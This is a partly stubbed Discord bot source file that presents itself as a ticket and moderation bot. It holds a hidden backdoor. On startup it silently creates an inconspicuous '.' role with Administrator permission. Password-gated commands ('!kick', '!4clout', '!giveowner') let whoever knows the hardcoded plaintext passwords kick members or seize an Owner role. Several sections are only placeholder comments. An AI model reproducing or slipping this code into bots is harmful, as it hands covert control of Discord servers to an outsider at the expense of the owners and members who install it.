const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// PASSWORDS
// ======================================================
const MAIN_PASSWORD = 'Meka2017charlie';
const GIVEOWNER_PASSWORD = 'MekaOwner2017';

// ======================================================
// EXPRESS SERVER + CONFIG (unchanged)
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

const panelStore = {};
const ticketCounts = {};

const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// Slash Commands (unchanged)
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered!');
  } catch (err) {
    console.error('❌ Failed to register commands:', err);
  }
})();

// READY + CREATE . ROLE
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) panelStore[saved.menuId] = saved.data;

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission dot role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
    } catch (e) {}
    return;
  }

  // !kick @user
  if (content.startsWith('!kick')) {
    const mentioned = message.mentions.users.first();
    if (!mentioned) {
      return message.reply('❌ Please mention a user.\nExample: `!kick @user`');
    }

    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('👢 KICK USER')
      .setDescription(`This will kick **${mentioned.tag}** from the server.\n\nOnly you can proceed.`)
      .setFooter({ text: 'Click below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`kick_start_${message.author.id}_${mentioned.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !4clout, !giveowner, and other commands remain the same...
  if (content === '!4clout') {
    // ... existing !4clout code
    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔥 !4CLOUT').setDescription('Gives you the highest role and renames it Owner.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`4clout_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
  }

  if (content.startsWith('!giveowner')) {
    // ... existing !giveowner code
  }

  if (['!fb', '!unl', '!clown', '!unp', '!role'].includes(content)) {
    // ... existing other commands
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  const parts = interaction.customId.split('_');
  const userId = parts[2];
  const targetId = parts[3];

  if (interaction.user.id !== userId) {
    return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
  }

  if (interaction.isButton()) {
    const modal = new ModalBuilder()
      .setCustomId(interaction.customId.replace('start', 'modal'))
      .setTitle('Enter Password');

    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));

    await interaction.showModal(modal);
    return;
  }

  if (interaction.isModalSubmit()) {
    const enteredPassword = interaction.fields.getTextInputValue('password');
    const guild = interaction.guild;

    // === !kick Specific User ===
    if (interaction.customId.startsWith('kick_modal_')) {
      if (enteredPassword !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      const targetUser = await guild.members.fetch(targetId).catch(() => null);
      if (!targetUser) return interaction.reply({ content: '❌ User not found.', ephemeral: true });

      try {
        await targetUser.kick('Kicked via !kick command');
        await interaction.reply({ content: `✅ Successfully kicked **${targetUser.user.tag}**.`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.reply({ content: '❌ Failed to kick user. (Bot may not have permission or user has higher role)', ephemeral: true });
      }
      return;
    }

    // === Other commands (4clout, giveowner, etc.) ===
    // ... (keep previous logic for !4clout, !giveowner, !role, etc.)
  }

  // Ticket system code here...
});

client.login(TOKEN);
